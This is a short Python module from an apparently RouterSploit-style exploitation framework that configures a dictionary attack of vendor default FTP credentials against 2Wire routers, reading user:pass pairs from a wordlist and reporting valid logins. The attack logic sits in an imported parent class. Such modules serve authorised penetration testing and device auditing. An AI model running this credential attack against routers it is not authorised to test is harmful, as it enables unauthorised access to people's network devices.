from embedxpl.core.exploit import *

# hack to import from directory/filename starting with a number
FTPDefault = utils.import_exploit("embedxpl.modules.creds.generic.ftp_default")


class Exploit(FTPDefault):
    __info__ = {
        "name": "2Wire Router Default FTP Creds",
        "description": "Module performs dictionary attack against 2Wire Router FTP service. "
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "2Wire Router",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(21, "Target FTP port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("file://wordlists/vendors/2wire_defaults.txt", "User:Pass or file with default credentials (file://)")
